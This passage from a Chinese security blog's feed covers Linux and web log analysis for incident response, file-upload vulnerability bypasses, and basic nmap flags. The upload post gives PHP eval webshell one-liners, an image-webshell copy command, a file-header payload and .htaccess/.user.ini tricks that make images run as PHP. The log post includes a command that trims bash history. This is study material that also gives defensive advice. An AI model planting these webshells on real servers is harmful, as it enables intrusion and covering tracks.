EventID&#x3D;4624&quot;</span><br></pre></td></tr></table></figure><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。</p><h4 id="常用日志-1"><a href="#常用日志-1" class="headerlink" title="常用日志"></a>常用日志</h4><p>日志默认存放地址：/var/log/</p><p>查看日志配置情况：more /etc/rsyslog.conf</p><p>比较重要的几个日志：</p><ul><li><p>登录失败记录：/var/log/btmp  、lastb</p></li><li><p>最后一次登录：/var/log/lastlog</p></li><li><p>登录成功记录: /var/log/wtmp 、last</p></li><li><p>登录日志记录：/var/log/secure</p></li><li><p>目前登录用户信息：/var/run/utmp 、w、who、users</p></li></ul><h4 id="日志分析技巧"><a href="#日志分析技巧" class="headerlink" title="日志分析技巧"></a>日志分析技巧</h4><p><strong>（1）常用shell命令</strong></p><p>通常利用shell快速查询，Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">### grep查找含有某字符串的所有文件</span><br><span class="line">grep -rn &quot;hello,world!&quot;</span><br><span class="line">    表示当前目录所有文件，也可以是某个文件名</span><br><span class="line">    -r 是递归查找</span><br><span class="line">    -n 是显示行号</span><br><span class="line">    -R 查找所有文件包含子目录</span><br><span class="line">    -i 忽略大小写</span><br><span class="line"></span><br><span class="line">### 只是显示&#x2F;etc&#x2F;passwd的账户</span><br><span class="line"></span><br><span class="line">&#96;cat &#x2F;etc&#x2F;passwd |awk  -F &#39;:&#39;  &#39;&#123;print $1&#125;&#39;&#96;  </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;awk -F指定域分隔符为&#39;:&#39;，将记录按指定的域分隔符划分域，填充域，$0则表示所有域,$1表示第一个域,$n表示第n个域。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 删除历史操作记录，只保留前153行</span><br><span class="line"></span><br><span class="line">sed -i &#39;153,$d&#39; .bash_history</span><br></pre></td></tr></table></figure><p><strong>（2）日志分析技巧</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; &#x2F;var&#x2F;log&#x2F;secure|perl -e &#39;while($_&#x3D;&lt;&gt;)&#123; &#x2F;for(.*?) from&#x2F;; print &quot;$1\n&quot;;&#125;&#39;|uniq -c|sort -nr</span><br><span class="line"></span><br><span class="line">2、登录成功的IP有哪些：     </span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $11&#125;&#39; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; &#x2F;var&#x2F;log&#x2F;secure | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;</span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name&#x3D;kali, GID&#x3D;1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name&#x3D;kali, UID&#x3D;1001, GID&#x3D;1001, home&#x3D;&#x2F;home&#x2F;kali</span><br><span class="line">, shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#39;kali&#39; owned by &#39;kali&#39;</span><br><span class="line"># grep &quot;userdel&quot; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid&#x3D;0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY&#x3D;pts&#x2F;4 ; PWD&#x3D;&#x2F;home&#x2F;good ; USER&#x3D;root ; COMMAND&#x3D;&#x2F;sbin&#x2F;shutdown -r now</span><br></pre></td></tr></table></figure><h2 id="web日志"><a href="#web日志" class="headerlink" title="web日志"></a>web日志</h2><blockquote><p> Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息</p></blockquote><p>通过Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p><p>对WEB日志进行安全分析，一般分两种思路：</p><ul><li>第一种：以<strong>入侵时间为线索</strong>，查找一定范围时间内的可疑日志，发现文件</li><li>第二种：<strong>通过留下的后门文件</strong>进行溯源</li></ul><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><ul><li><p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p></li><li><p>Linux下，使用Shell命令组合查询分析。</p></li></ul><p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p><p>Apache日志分析技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：</span><br><span class="line">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class="line"></span><br><span class="line">2、查看当天有多少个IP访问：</span><br><span class="line">awk &#39;&#123;print $1&#125;&#39; log_file|sort|uniq|wc -l</span><br><span class="line"></span><br><span class="line">3、查看某一个页面被访问的次数：</span><br><span class="line">grep &quot;&#x2F;index.php&quot; log_file | wc -l</span><br><span class="line"></span><br><span class="line">4、查看每一个IP访问了多少个页面：</span><br><span class="line">awk &#39;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#39; log_file</span><br><span class="line"></span><br><span class="line">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class="line">awk &#39;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#39; log_file | sort -n</span><br><span class="line"></span><br><span class="line">6、查看某一个IP访问了哪些页面：</span><br><span class="line">grep ^111.111.111.111 log_file| awk &#39;&#123;print $1,$7&#125;&#39;</span><br><span class="line"></span><br><span class="line">7、去掉搜索引擎统计当天的页面：</span><br><span class="line">awk &#39;&#123;print $12,$1&#125;&#39; log_file | grep ^\&quot;Mozilla | awk &#39;&#123;print $2&#125;&#39; |sort | uniq | wc -l</span><br><span class="line"></span><br><span class="line">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class="line">awk &#39;&#123;print $4,$1&#125;&#39; log_file | grep 21&#x2F;Jun&#x2F;2018:14 | awk &#39;&#123;print $2&#125;&#39;| sort | uniq | wc -l</span><br></pre></td></tr></table></figure><h3 id="日志分析案例"><a href="#日志分析案例" class="headerlink" title="日志分析案例"></a>日志分析案例</h3><p>（1）攻击者通过代理转发，上传了图片马，如何追溯攻击者IP</p><p>由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p><ul><li><p><strong>先定位代理IP攻击源</strong></p><p>首先访问图片木马的记录，可以找到访问的代理IP，但并不能通过IP来还原攻击路径</p></li><li><p><strong>定位攻击源IP</strong></p><p>这时候，可以利用浏览器指纹来定位到真实IP。</p></li><li><p><strong>发现漏洞点</strong></p><p>知道了攻击源IP，查找其访问，可以推断出漏洞点位置</p></li></ul><h2 id="数据库日志"><a href="#数据库日志" class="headerlink" title="数据库日志"></a>数据库日志</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://bypass007.github.io/Emergency-Response-Notes/LogAnalysis/">https://bypass007.github.io/Emergency-Response-Notes/LogAnalysis/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;日志分析&quot;&gt;&lt;a href=&quot;#日志分析&quot; class=&quot;headerlink&quot; title=&quot;日志分析&quot;&gt;&lt;/a&gt;日志分析&lt;/h3&gt;&lt;p&gt;概述：将主机系统安全日志/操作日志、网络设备流量日志、Web应用访问日志、SQL应用访问日志等日志集中到一个统一的后台，在后</summary>
      
    
    
    
    <category term="blue" scheme="http://example.com/categories/blue/"/>
    
    
    <category term="日志分析" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>文件上传</title>
    <link href="http://example.com/2021/04/30/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://example.com/2021/04/30/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2021-04-29T18:39:49.000Z</published>
    <updated>2021-05-24T13:58:55.963Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p><strong>概述</strong>：对用户文件上传的<strong>控制不足</strong>或者<strong>处理缺陷</strong>，导致用户可以越过本身权限向服务器上传<strong>可执行的动态脚本文件</strong>。“文件上传”功能本身没有问题，有问题的是文件上传后，<strong>后端服务器如何处理、解释文件</strong>。</p><h2 id="文件上传攻击的演变"><a href="#文件上传攻击的演变" class="headerlink" title="文件上传攻击的演变"></a>文件上传攻击的演变</h2><ul><li><p>客户端</p><ul><li>前端 JS 校验</li></ul></li><li><p>服务端</p><ul><li>文件后缀校验</li><li>文件类型校验</li><li>文件内容校验</li><li>自定义规则校验</li></ul></li></ul><p>==================</p><p>文件上传测试点 -图片</p><p>===================</p><h2 id="客户端校验（前端）"><a href="#客户端校验（前端）" class="headerlink" title="客户端校验（前端）"></a>客户端校验（前端）</h2><h3 id="JavaScript检查"><a href="#JavaScript检查" class="headerlink" title="JavaScript检查"></a><strong>JavaScript检查</strong></h3><p>​    方法1：浏览器禁js</p><p>​    方法2：burp抓包 先上传白名单文件，再用burp修改上传文件后缀（一句话木马）</p><h2 id="服务端校验（后端）"><a href="#服务端校验（后端）" class="headerlink" title="服务端校验（后端）"></a>服务端校验（后端）</h2><h3 id="文件后缀校验"><a href="#文件后缀校验" class="headerlink" title="文件后缀校验"></a>文件后缀校验</h3><p><strong>黑名单</strong></p><ul><li>大小写绕过</li><li>非黑名单列表爆破</li><li>特殊文件名绕过</li><li>0x00截断绕过</li><li>配合解析漏洞</li><li>双写绕过</li></ul><p><strong>白名单</strong></p><ul><li>0x00截断绕过</li><li>解析漏洞绕过（1.php.jpg）</li><li>.htaccess文件修改配置</li></ul><p>黑名单：寻找漏网之鱼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">-------------------------------------</span><br><span class="line">(1)文件名大小写绕过:Asp Php PHp等等</span><br><span class="line">   只适合windos系统(对大小写不敏感)</span><br><span class="line"></span><br><span class="line"> ### Windows系统下，对于文件名中的大小写不敏感。例如：test.php和TeSt.PHP是一样的。</span><br><span class="line"> ### Linux系统下 test.php和 TesT.php不一样。</span><br><span class="line"></span><br><span class="line">-------------------------------------</span><br><span class="line">(2)非黑名单列表绕过</span><br><span class="line">jsp jspx jspf jspa jsw jsv jtml</span><br><span class="line">asp asa asax cer cdx aspx ascx ashx asmx asp&#123;80-90&#125;</span><br><span class="line">php php1 php2 php3 php4 php5 phtml phtm phps phpt php345 shtml pwml phtm</span><br><span class="line">exe exee vbs asis</span><br><span class="line">inc sh reg cgi exe dll com bat pl cfc cfm ini 等。</span><br><span class="line"></span><br><span class="line">-------------------------------------</span><br><span class="line">(3)系统命名绕过</span><br><span class="line">###利用不符合 windows 系统的格式，但 windows 会自动去除的特性</span><br><span class="line">test.php.</span><br><span class="line">test.php_(下划线)     </span><br><span class="line">test.php (有空格)     对于文件名中空格会被作为空处理，代码不会删除</span><br><span class="line">php:1.jpg</span><br><span class="line">php::$DATA  # ::$data被当作文件流处理，最后只保留::$DATA之前的文件名以及后缀</span><br></pre></td></tr></table></figure><h3 id="文件类型校验-MIME验证"><a href="#文件类型校验-MIME验证" class="headerlink" title="文件类型校验(MIME验证)"></a>文件类型校验(MIME验证)</h3><p>只检测数据包 content-type 字段导致的漏洞。（一般是通过后端利用PHP的全局数组 <code>$_FIFS()</code> ，通过<code>_FIFS[&#39;myFile&#39;][&#39;type&#39;]</code> 的获取文件类型）</p><p>攻击手法：抓包修改 content-type 字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">image&#x2F;jpeg ：jpg图片格式</span><br><span class="line">   image&#x2F;png  ：png图片格式</span><br><span class="line">   image&#x2F;gif  ：gif图片格式  </span><br><span class="line">   text&#x2F;plain ：纯文本格式   </span><br><span class="line">   text&#x2F;xml   ：  XML格式</span><br><span class="line">   text&#x2F;html  ： HTML格式</span><br><span class="line">   application&#x2F;octet-strea：php格式</span><br><span class="line">   multipart&#x2F;form-data ： 需要在表单中进行文件上传时，就需要使用该格式</span><br></pre></td></tr></table></figure><h3 id="文件内容校验"><a href="#文件内容校验" class="headerlink" title="文件内容校验"></a>文件内容校验</h3><p>后端代码对上传文件的具体内容进行检测</p><p><strong>检测一：文件头校验</strong></p><ul><li><p><strong>getimagesize() 函数</strong></p></li><li><p><strong>exif_imagetype() 函数</strong></p><blockquote><p>php内置函数，通过读取一个图像的第一个字节并检查其签名 检测其是否为图片类型文件</p></blockquote></li></ul><p>绕过手法：</p><p>（1）添加标志头</p><table><thead><tr><th>类型</th><th>二进制值</th><th>字符串形式</th></tr></thead><tbody><tr><td>JPG</td><td>FF D8 FF E0 00 10 4A 46 49 46</td><td>?</td></tr><tr><td>GIF</td><td>47 49 46 38 39 61</td><td>GIF89a</td></tr><tr><td>PNG</td><td>89 50 4E 47</td><td>塒NG</td></tr><tr><td>TIF</td><td>49 49 2A 00</td><td>II*</td></tr><tr><td>BMP</td><td>42 4D</td><td>BM</td></tr></tbody></table><p>（2）制作图片马</p><p>（3）修改配置文件（.htaccess、php.ini）</p><p>（3）预定义高度宽度</p><p>（4）利用<code>x00x00x8ax39x8ax39</code>文件头</p><p>x00x00x8ax30x8ax39 是 wbmp 文件的文件头，但 0x00在 .htaccess 文件中为是注释符，不会影响文件本身。<strong>使用十六进制编辑器或者python的bytes字符类型(b’’)来进行添加。</strong></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell &#x3D; b&quot;\x00\x00\x8a\x39\x8a\x39&quot;+b&quot;00&quot; + &#39;文件内容&#39;</span><br></pre></td></tr></table></figure><p><strong>检测二：内容关键字匹配 &lt;?php ?&gt;</strong></p><p>绕过手法：短标签绕过、编码绕过、版本漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">适用于PHP5.x版本</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">短标签</span><br><span class="line">&lt;?&#x3D;@eval($_POST[&#39;abd&#39;]);?&gt;</span><br></pre></td></tr></table></figure><p><strong>检测三：二次渲染</strong></p><p>对上传的图片进行二次修改，删除恶意代码</p><p>绕过手法：</p><p>一般采用上传gif的图片码 (gif较容易)</p><p>寻找二次渲染后文件十六进制 不变的地方</p><p>对gif加入木马代码再次上传</p><h3 id="自定义规则"><a href="#自定义规则" class="headerlink" title="自定义规则"></a>自定义规则</h3><p>对上传的文件进行重命名，隐藏上传路径等等</p><h4 id="通用手法"><a href="#通用手法" class="headerlink" title="通用手法"></a><strong>通用手法</strong></h4><p><strong>（1）图片马</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy logo.jpg&#x2F;b+test.php&#x2F;a   test.jpg</span><br></pre></td></tr></table></figure><p><strong>（2）配合解析漏洞</strong></p><p><strong>（3）利用配置文件</strong></p><p><strong>.htaccess</strong></p><p>可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(1)</span><br><span class="line">&lt;FilesMatch &quot;1.gif&quot;&gt;            #将&quot;1.gif文件解析成php文件 可以通过修改1.gif来变化&quot;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">(2)</span><br><span class="line">AddType application&#x2F;x-http-php .jpg      #将所有jpg文件解析成php文件</span><br></pre></td></tr></table></figure><p><strong>.user.ini</strong></p><p>适用 Nginx/apache/IIS，当使用CGI／FastCGI来解析php时，php会优先搜索目录下所有的.ini文件，并应用其中的配置。类似于apache的.htaccess，但语法与.htacces不同，语法跟php.ini一致。</p><p>.user.ini文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;test.jpg</span><br></pre></td></tr></table></figure><p>所有的php文件都自动包含test.jpg文件。<code>.user.ini</code>相当于一个用户自定义的<code>php.ini</code>。</p><h4 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h4><blockquote><p>详见在标签文章</p></blockquote><ul><li>竞争上传</li></ul><h2 id="其他绕过手法"><a href="#其他绕过手法" class="headerlink" title="其他绕过手法"></a>其他绕过手法</h2><ul><li>配合文件包含漏洞</li><li>解析漏洞</li><li>OS系统特性</li><li>CMS、编辑器漏洞</li><li>配合其他规则</li><li>WAF绕过</li></ul><h3 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h3><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p><p>绕过方式：（此漏洞主要存在PHP中）</p><p>（1）上传内容为木马的txt、jpg图片</p><p>（2）上传具有文件包含功能的php文件</p><h3 id="CMS、编辑器漏洞"><a href="#CMS、编辑器漏洞" class="headerlink" title="CMS、编辑器漏洞"></a>CMS、编辑器漏洞</h3><p>（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。<br>（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。<br>这两方面的漏洞以后单独成文汇总，这里点到为止。</p><h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><h2 id="开发人员防御原则"><a href="#开发人员防御原则" class="headerlink" title="开发人员防御原则"></a>开发人员防御原则</h2><hr><p>上传成功+获取路径+解析成功=getshell</p><ul><li><p>隐藏上传文件路径</p></li><li><p>使用配置文件配置web容器不对上传目录下的文件做解析</p></li><li><p>文件后缀名白名单校验</p></li><li><p>上传文件进行重命名(随机)</p></li></ul><p><strong>黑名单</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#39;php&#39;,&#39;phtml&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;php3&#39;,&#39;php2&#39;,&#39;php1&#39;,&#39;html&#39;,&#39;htm&#39;,&#39;phtml&#39;,&#39;pHp&#39;,&#39;pHp5&#39;,&#39;pHp4&#39;,&#39;pHp3&#39;,&#39;pHp2&#39;,&#39;pHp1&#39;,&#39;Html&#39;,&#39;Htm&#39;,&#39;pHtml&#39;,&#39;jsp&#39;,&#39;jspa&#39;,&#39;jspx&#39;,&#39;jsw&#39;,&#39;jsv&#39;,&#39;jspf&#39;,&#39;jtml&#39;,&#39;jSp&#39;,&#39;jSpx&#39;,&#39;jSpa&#39;,&#39;jSw&#39;,&#39;jSv&#39;,&#39;jSpf&#39;,&#39;jHtml&#39;,&#39;asp&#39;,&#39;aspx&#39;,&#39;asa&#39;,&#39;asax&#39;,&#39;ascx&#39;,&#39;ashx&#39;,&#39;asmx&#39;,&#39;cer&#39;,&#39;aSp&#39;,&#39;aSpx&#39;,&#39;aSa&#39;,&#39;aSax&#39;,&#39;aScx&#39;,&#39;aShx&#39;,&#39;aSmx&#39;,&#39;cEr&#39;,&#39;sWf&#39;,&#39;swf&#39;,&#39;htaccess&#39;,&#39;ini&#39;,&#39;inc&#39;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;,&quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;,&quot;&#123;&quot;,&quot;&#125;&quot;, &quot;swf&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.freebuf.com/articles/web/188464.html">构造优质上传漏洞Fuzz字典</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;概述&lt;/strong&gt;：对用户文件上传的&lt;strong&gt;控制不足&lt;/strong&gt;或者&lt;st</summary>
      
    
    
    
    <category term="Red" scheme="http://example.com/categories/Red/"/>
    
    <category term="常见web漏洞" scheme="http://example.com/categories/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>工具使用</title>
    <link href="http://example.com/2021/04/30/Blue/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2021/04/30/Blue/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</id>
    <published>2021-04-29T18:39:49.000Z</published>
    <updated>2021-04-29T12:40:13.069Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>功能</p><ul><li>发现主机</li><li>扫描端口</li><li>路由追踪</li></ul><p><strong>常用参数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">发现主机</span><br><span class="line">-sP(Ping扫描) 只进行主机发现，不进行端口扫描，降低被发现</span><br><span class="line">-sL 仅将指定的目标的IP列举出来，不进行主机发现(比如列出网段下的IP)</span><br><span class="line"></span><br><span class="line">端口扫描</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">路由跟踪</span><br><span class="line">-traceroute</span><br><span class="line"></span><br><span class="line">输出结果</span><br><span class="line">-vv 对结果进行详细输出</span><br></pre></td></tr></table></figure><p>基础操作</p><p>(1)发现主机  -sP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP IP&#x2F;CIDR   nmap -sP</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;工具使用&quot;&gt;&lt;a href=&quot;#工具使用&quot; class=&quot;headerlink&quot; title=&quot;工具使用&quot;&gt;&lt;/a&gt;工具使用&lt;/h1&gt;&lt;h2 id=&quot;nmap&quot;&gt;&lt;a href=&quot;#nmap&quot; class=&quot;headerlink&quot; title=&quot;nmap&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="blue" scheme="http://example.com/categories/blue/"/>
    
    
    <category term="工具使用" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>中间件漏洞</title>
    <link href="http://example.com/2021/04/30/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/04/30/Red/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-29T18:39:49.000Z</published>
    <updated>2021-04-30T03:12:52.795Z</updated>
    
